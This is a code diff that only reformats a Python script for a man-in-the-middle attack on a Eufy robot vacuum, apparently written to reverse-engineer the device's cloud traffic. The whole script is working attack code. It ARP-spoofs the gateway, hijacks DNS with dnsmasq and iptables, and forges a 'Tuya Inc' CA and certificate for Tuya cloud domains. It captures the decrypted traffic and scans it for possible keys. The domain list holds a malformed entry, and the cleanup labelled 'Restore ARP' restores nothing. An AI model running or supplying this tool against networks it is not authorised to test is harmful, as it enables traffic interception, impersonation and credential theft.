@@ -10,15 +10,15 @@ MITM attack on Eufy X10 Pro Omni vacuum.
 Run as root. User must power-cycle the vacuum after this starts.
 """
 
-import threading
-import ssl
-import socket
 import json
-import struct
 import os
-import sys
-import time
+import socket
+import ssl
+import struct
 import subprocess
+import sys
+import threading
+import time
 from datetime import datetime
 
 VACUUM_IP = "192.168.1.XXX"
@@ -27,15 +27,24 @@ OUR_IP = "192.168.1.YYY"
 INTERFACE = "eth0"
 
 TUYA_DOMAINS = [
-    "a1.tuyaeu.com", "a2.tuyaeu.com",
-    "a1.tuyaus.com", "a2.tuyaus.com",
-    "a1.tuyacn.com", "a2.tuyacn.com",
-    "m1.tuyaeu.com", "m2.tuyaeu.com",
-    "m1.tuyaus.com", "m2.tuyaus.com",
-    "m1.tuyacn.com", "m2.tuyacn.com",
-    "a.]tuyaeu.com", "a.tuyaus.com",
-    "mqtt.tuyaeu.com", "mqtt.tuyaus.com",
-    "mqtt-eu.tuyaeu.com", "mqtt-us.tuyaus.com",
+    "a1.tuyaeu.com",
+    "a2.tuyaeu.com",
+    "a1.tuyaus.com",
+    "a2.tuyaus.com",
+    "a1.tuyacn.com",
+    "a2.tuyacn.com",
+    "m1.tuyaeu.com",
+    "m2.tuyaeu.com",
+    "m1.tuyaus.com",
+    "m2.tuyaus.com",
+    "m1.tuyacn.com",
+    "m2.tuyacn.com",
+    "a.]tuyaeu.com",
+    "a.tuyaus.com",
+    "mqtt.tuyaeu.com",
+    "mqtt.tuyaus.com",
+    "mqtt-eu.tuyaeu.com",
+    "mqtt-us.tuyaus.com",
 ]
 
 LOG_DIR = "/tmp/mitm_captures"
@@ -55,12 +64,25 @@ def generate_certs():
     srv_cert = os.path.join(LOG_DIR, "server.crt")
 
     if not os.path.exists(ca_cert):
-        subprocess.run([
-            "openssl", "req", "-x509", "-newkey", "rsa:2048",
-            "-keyout", ca_key, "-out", ca_cert,
-            "-days", "365", "-nodes",
-            "-subj", "/CN=Tuya Cloud CA/O=Tuya Inc"
-        ], capture_output=True)
+        subprocess.run(
+            [
+                "openssl",
+                "req",
+                "-x509",
+                "-newkey",
+                "rsa:2048",
+                "-keyout",
+                ca_key,
+                "-out",
+                ca_cert,
+                "-days",
+                "365",
+                "-nodes",
+                "-subj",
+                "/CN=Tuya Cloud CA/O=Tuya Inc",
+            ],
+            capture_output=True,
+        )
 
     san_conf = os.path.join(LOG_DIR, "san.cnf")
     san_names = "\n".join(f"DNS.{i+1} = {d}" for i, d in enumerate(TUYA_DOMAINS))
@@ -81,20 +103,48 @@ subjectAltName = @alt_names
 {san_names}
 """)
 
-    subprocess.run([
-        "openssl", "req", "-newkey", "rsa:2048", "-nodes",
-        "-keyout", srv_key, "-out", os.path.join(LOG_DIR, "server.csr"),
-        "-subj", "/CN=a1.tuyaeu.com/O=Tuya Inc",
-        "-config", san_conf
-    ], capture_output=True)
+    subprocess.run(
+        [
+            "openssl",
+            "req",
+            "-newkey",
+            "rsa:2048",
+            "-nodes",
+            "-keyout",
+            srv_key,
+            "-out",
+            os.path.join(LOG_DIR, "server.csr"),
+            "-subj",
+            "/CN=a1.tuyaeu.com/O=Tuya Inc",
+            "-config",
+            san_conf,
+        ],
+        capture_output=True,
+    )
 
-    subprocess.run([
-        "openssl", "x509", "-req",
-        "-in", os.path.join(LOG_DIR, "server.csr"),
-        "-CA", ca_cert, "-CAkey", ca_key, "-CAcreateserial",
-        "-out", srv_cert, "-days", "365",
-        "-extensions", "v3_req", "-extfile", san_conf
-    ], capture_output=True)
+    subprocess.run(
+        [
+            "openssl",
+            "x509",
+            "-req",
+            "-in",
+            os.path.join(LOG_DIR, "server.csr"),
+            "-CA",
+            ca_cert,
+            "-CAkey",
+            ca_key,
+            "-CAcreateserial",
+            "-out",
+            srv_cert,
+            "-days",
+            "365",
+            "-extensions",
+            "v3_req",
+            "-extfile",
+            san_conf,
+        ],
+        capture_output=True,
+    )
 
     log(f"Certs generated: {srv_cert}")
     return srv_key, srv_cert
@@ -102,7 +152,7 @@ subjectAltName = @alt_names
 
 def start_arp_spoof():
     log("Starting ARP spoof (become gateway for vacuum)...")
-    from scapy.all import ARP, Ether, sendp, getmacbyip
+    from scapy.all import ARP, Ether, getmacbyip, sendp
 
     vacuum_mac = getmacbyip(VACUUM_IP)
     gateway_mac = getmacbyip(GATEWAY_IP)
@@ -165,16 +215,32 @@ def start_dns_redirect():
 
     proc = subprocess.Popen(
         ["dnsmasq", "-C", dnsmasq_conf, "--no-daemon", "--log-queries"],
-        stdout=subprocess.PIPE, stderr=subprocess.STDOUT
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
     )
     log(f"dnsmasq running (PID {proc.pid})")
 
     # Redirect vacuum's DNS to us via iptables
-    subprocess.run([
-        "iptables", "-t", "nat", "-A", "PREROUTING",
-        "-s", VACUUM_IP, "-p", "udp", "--dport", "53",
-        "-j", "DNAT", "--to-destination", f"{OUR_IP}:53"
-    ], capture_output=True)
+    subprocess.run(
+        [
+            "iptables",
+            "-t",
+            "nat",
+            "-A",
+            "PREROUTING",
+            "-s",
+            VACUUM_IP,
+            "-p",
+            "udp",
+            "--dport",
+            "53",
+            "-j",
+            "DNAT",
+            "--to-destination",
+            f"{OUR_IP}:53",
+        ],
+        capture_output=True,
+    )
     log("DNS iptables redirect set")
 
     return proc
@@ -190,9 +256,7 @@ def start_tls_servers(srv_key, srv_cert):
     servers = []
     for port in [443, 8883, 1883, 6668, 9668, 80]:
         try:
-            t = threading.Thread(
-                target=run_tls_server, args=(ctx, port), daemon=True
-            )
+            t = threading.Thread(target=run_tls_server, args=(ctx, port), daemon=True)
             t.start()
             servers.append(t)
             log(f"  TLS server on port {port}")
@@ -234,7 +298,7 @@ def run_tls_server(ctx, port):
                         data += chunk
                         if len(data) > 65536:
                             break
-                except socket.timeout:
+                except TimeoutError:
                     pass
 
                 if data:
@@ -259,7 +323,9 @@ def run_tls_server(ctx, port):
                     raw = client.recv(4096)
                     if raw:
                         ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-                        with open(os.path.join(LOG_DIR, f"raw_{port}_{ts}.bin"), "wb") as f:
+                        with open(
+                            os.path.join(LOG_DIR, f"raw_{port}_{ts}.bin"), "wb"
+                        ) as f:
                             f.write(raw)
                         log(f"  📦 Raw capture {len(raw)} bytes: {raw[:64].hex()}")
                 except:
@@ -273,9 +339,7 @@ def run_tls_server(ctx, port):
 def also_run_plain_tcp_servers():
     for port in [443, 8883, 1883, 6668, 9668, 80, 7000, 9667]:
         try:
-            t = threading.Thread(
-                target=run_plain_tcp_server, args=(port,), daemon=True
-            )
+            t = threading.Thread(target=run_plain_tcp_server, args=(port,), daemon=True)
             t.start()
         except:
             pass
@@ -321,24 +385,25 @@ def analyze_capture(data, port):
         log(f"  Data: {data_str[:500]}")
 
     # Look for MQTT CONNECT packet (starts with 0x10)
-    if data[0:1] == b'\x10':
+    if data[0:1] == b"\x10":
         log(f"  📡 MQTT CONNECT packet detected on port {port}!")
         log(f"  Full hex: {data[:256].hex()}")
 
     # Look for protobuf messages
-    if data[0:1] in (b'\x08', b'\x0a', b'\x12', b'\x1a'):
+    if data[0:1] in (b"\x08", b"\x0a", b"\x12", b"\x1a"):
         log(f"  📋 Possible protobuf on port {port}")
 
     # Look for Tuya protocol headers (0x000055aa)
-    if b'\x00\x00\x55\xaa' in data:
+    if b"\x00\x00\x55\xaa" in data:
         log(f"  ⚡ Tuya protocol header found on port {port}!")
         log(f"  Data: {data[:256].hex()}")
 
     # Look for any 16-char alphanumeric strings (potential keys)
     import re
-    keys = re.findall(rb'[a-zA-Z0-9]{16}', data)
+
+    keys = re.findall(rb"[a-zA-Z0-9]{16}", data)
     if keys:
-        unique = list(set(k.decode() for k in keys))
+        unique = list({k.decode() for k in keys})
         log(f"  🔍 16-char strings found: {unique[:10]}")
 
 
@@ -366,11 +431,26 @@ def main():
 
     # Redirect ALL TCP from vacuum to us (transparent proxy)
     for port in [443, 8883, 1883]:
-        subprocess.run([
-            "iptables", "-t", "nat", "-A", "PREROUTING",
-            "-s", VACUUM_IP, "-p", "tcp", "--dport", str(port),
-            "-j", "REDIRECT", "--to-port", str(port)
-        ], capture_output=True)
+        subprocess.run(
+            [
+                "iptables",
+                "-t",
+                "nat",
+                "-A",
+                "PREROUTING",
+                "-s",
+                VACUUM_IP,
+                "-p",
+                "tcp",
+                "--dport",
+                str(port),
+                "-j",
+                "REDIRECT",
+                "--to-port",
+                str(port),
+            ],
+            capture_output=True,
+        )
     log("iptables TCP redirect set for ports 443, 8883, 1883")
 
     # Step 4: Start TLS servers
@@ -386,9 +466,16 @@ def main():
 
     # Also start tcpdump for full capture
     tcpdump = subprocess.Popen(
-        ["tcpdump", "-i", INTERFACE, f"host {VACUUM_IP}", "-w",
-         os.path.join(LOG_DIR, "full_capture.pcap")],
-        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        [
+            "tcpdump",
+            "-i",
+            INTERFACE,
+            f"host {VACUUM_IP}",
+            "-w",
+            os.path.join(LOG_DIR, "full_capture.pcap"),
+        ],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
     )
 
     try:
@@ -397,7 +484,9 @@ def main():
     except KeyboardInterrupt:
         log("Shutting down...")
         # Cleanup iptables
-        subprocess.run(["iptables", "-t", "nat", "-F", "PREROUTING"], capture_output=True)
+        subprocess.run(
+            ["iptables", "-t", "nat", "-F", "PREROUTING"], capture_output=True
+        )
         # Restore ARP
         subprocess.run(["pkill", "-f", "dnsmasq"], capture_output=True)
         tcpdump.terminate()
